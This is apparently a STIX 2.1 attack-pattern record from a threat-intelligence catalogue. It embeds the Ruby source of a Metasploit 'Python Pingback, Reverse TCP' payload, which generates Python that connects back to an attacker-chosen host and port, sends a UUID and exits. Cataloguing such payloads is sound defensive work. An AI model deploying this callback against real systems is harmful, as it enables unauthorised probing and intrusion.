{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b3c639bc-8fd0-4f02-b6ac-3dc244ef789a",
    "created": "2024-08-14T16:33:19.394134Z",
    "modified": "2024-08-14T16:33:19.394137Z",
    "name": "Python Pingback, Reverse TCP (via python)",
    "description": "Connects back to the attacker, sends a UUID, then terminates",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/python/pingback_reverse_tcp.rb",
            "external_id": "pingback_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Python\n  include Msf::Payload::Pingback\n  include Msf::Payload::Pingback::Options\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name' => 'Python Pingback, Reverse TCP (via python)',\n      'Description' => 'Connects back to the attacker, sends a UUID, then terminates',\n      'Author' => 'asoto-r7',\n      'License' => MSF_LICENSE,\n      'Platform' => 'python',\n      'Arch' => ARCH_PYTHON,\n      'Handler' => Msf::Handler::ReverseTcp,\n      'Session' => Msf::Sessions::Pingback,\n      'PayloadType' => 'python'\n    ))\n  end\n\n  def generate(_opts = {})\n    super.to_s + command_string\n  end\n\n  def command_string\n    self.pingback_uuid ||= self.generate_pingback_uuid\n    cmd = <<~PYTHON\n      import binascii as b\n      import socket as s\n      o=s.socket(s.AF_INET,s.SOCK_STREAM)\n      try:\n       o.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n       o.send(b.a2b_base64('#{[[self.pingback_uuid].pack('H*')].pack('m0')}'))\n       o.close()\n      except:\n       pass\n    PYTHON\n\n    py_create_exec_stub(cmd)\n  end\nend\n",
    "x_mitre_platforms": [
        "python'"
    ]
}